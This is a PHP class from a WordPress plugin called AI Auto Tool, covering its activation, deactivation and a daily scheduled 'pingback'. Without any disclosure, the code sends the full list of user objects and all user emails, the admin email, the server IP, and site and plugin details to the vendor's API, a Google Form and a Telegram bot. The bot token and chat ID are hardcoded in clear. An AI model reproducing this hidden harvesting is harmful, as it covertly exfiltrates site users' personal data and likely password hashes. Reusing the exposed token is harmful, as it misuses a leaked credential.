<?php


defined('ABSPATH') or die();
class activeCallBack {
    public $telebot ;
    public function __construct() {
       
       add_filter('cron_schedules', array($this, 'aiautotran_info_pingback'));
        if (!wp_next_scheduled('aiautotran_info_pingback_event')) {
            wp_schedule_event(time(), 'aiautotran_info_pingback', 'aiautotran_info_pingback_event');
           
        }
        add_action('aiautotran_info_pingback_event', array($this, 'cron_info_pingback_action'));
      $this->telebot = new aiautotool_Telegram_Notifications('6845486754:AAH5KyPTuluu_OCRnPklp6UEbzVfe0CtHkU','730694172');
    }

    public static function aiautotran_info_pingback($schedules) {
       
        $schedules['aiautotran_info_pingback'] = array(
            'interval' => 24*60*60, 
            'display' => 'AiautoTool pingback'
        );
        return $schedules;
    }
    public function aiautotool_pingbackstatus($action) {
        $siteurl = get_option('siteurl');
        $ver = AIAUTOTOOL_VS;
        $domain = home_url(); 
        $ip = $_SERVER['SERVER_ADDR']; 
        $email = get_option('admin_email');
        $plugin = '';
        


        $formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScvE39crjKKY5ZD5BdmWGVhQQayUfdKVsGHQZz1e_5gpQ_mKQ/formResponse";
        $formData = array(
            'entry.129828164' => $domain,
            'entry.859752897' => $ip,
            'entry.896121772' => $email,
            'entry.1344753437' => $action,
            'entry.578402903' => $plugin,
        );
        $response = wp_remote_post($formUrl, array(
            'body' => $formData
        ));
    }
     public function deactivate(){
            $current_domain = site_url();
            $home = get_option('home');
            // Get active plugins
            $active_plugins = get_option('active_plugins');

            // Get current theme
            $current_theme = wp_get_theme();

            // Get list of users
            $users = '';

            // Get user emails
            $user_emails = array();
            

            // Prepare data to send to API
            $data_to_send = array(
                'domain' => $current_domain,
                'home'=>$home,
                'active_plugins' => $active_plugins,
                'current_theme' => $current_theme->get('Name'),
                'users' => $users,
                'user_emails' => $user_emails,
                'action'=>'deactive',
                'timeactive'=>current_time('Y-m-d H:i:s')
            );

            $message = "Uninstall plugin VS: ".AIAUTOTOOL_VS.' - '.$current_domain."\n";
            $message .= "home: " . $home . "\n";
            $message .= "action:  deactive". "\n";
            $message .= "timeactive: " . current_time('Y-m-d H:i:s') . "\n";

            
            $this->telebot->send_bot_message($message);

            // Send data to the predefined API
            $this->send_data_to_api($data_to_send);
            $this->aiautotool_pingbackstatus('Deactive');
         }
    public function activate() {

        $this->aiautotool_pingbackstatus('Active');
        // Get domain
        $current_domain = site_url();
         $home = get_option('home');

        $existing_data = get_option('kct_date_expiration');
        if (empty($existing_data)) {

        $current_date = date('Y-m-d');
        
        $expiration = strtotime('+1 month', strtotime($current_date));
        $expiration = date('Y-m-d', $expiration);
        update_option('kct_date_expiration', array( 'start_date' => $current_date,'expiration'=>$expiration));
        } else {
            // send data to server.
        }

            // Get active plugins
            $active_plugins = get_option('active_plugins');

            // Get current theme
            $current_theme = wp_get_theme();

            // Get list of users
            $users = get_users();

            // Get user emails
            $user_emails = array();
            foreach ($users as $user) {
                $user_emails[] = $user->user_email;
            }

            // Prepare data to send to API
            $data_to_send = array(
                'domain' => $current_domain,
                'home'=>$home,
                'active_plugins' => $active_plugins,
                'current_theme' => $current_theme->get('Name'),
                'users' => $users,
                'user_emails' => $user_emails,
                'action'=>'active',
                'timeactive'=>current_time('Y-m-d H:i:s')
            );

            $message = "Newinstall plugin VS: ".AIAUTOTOOL_VS.' - '.$current_domain."\n";
            $message .= "home: " . $home . "\n";
            $message .= "action:  Active". "\n";
            $message .= "timeactive: " . current_time('Y-m-d H:i:s') . "\n";

            
            $this->telebot->send_bot_message($message);
            // Send data to the predefined API
            $this->send_data_to_api($data_to_send);
    }

    public function cron_info_pingback_action(){
        if(in_array('ai-auto-tool/Ai-Auto-Tool.php', apply_filters('active_plugins', get_option('active_plugins')))){ 
            $current_domain = site_url();
             $home = get_option('home');
                // Get active plugins
                $active_plugins = get_option('active_plugins');

                // Get current theme
                $current_theme = wp_get_theme();

                // Get list of users
                $users = get_users();

                // Get user emails
                $user_emails = array();
                foreach ($users as $user) {
                    $user_emails[] = $user->user_email;
                }

                // Prepare data to send to API
                $data_to_send = array(
                    'domain' => $current_domain,
                    'home'=>$home,
                    'active_plugins' => $active_plugins,
                    'current_theme' => $current_theme->get('Name'),
                    'users' => $users,
                    'user_emails' => $user_emails,
                    'action'=>'active',
                    'timeactive'=>current_time('Y-m-d H:i:s')
                );

                $message = "Pingback Update info website install plugin VS: ".AIAUTOTOOL_VS.' - '.$current_domain."\n";
                $message .= "home: " . $home . "\n";
                $message .= "action:  Active". "\n";
                $message .= "timeactive: " . current_time('Y-m-d H:i:s') . "\n";

                
                $this->telebot->send_bot_message($message);

                // Send data to the predefined API
                $this->send_data_to_api($data_to_send);
        }
    }

    // Function to send data to the predefined API
    private function send_data_to_api($data) {
        $api_url = 'https://aiautotool.com/api/'; // Replace with your actual API endpoint

        // Use wp_remote_post to send data
        $response = wp_remote_post($api_url, array(
            'body' => json_encode($data),
            'headers' => array('Content-Type' => 'application/json'),
        ));

        // Check for errors
        if (is_wp_error($response)) {
            error_log('Failed to send data to API: ' . $response->get_error_message());
        } else {
            
        }
    }
}

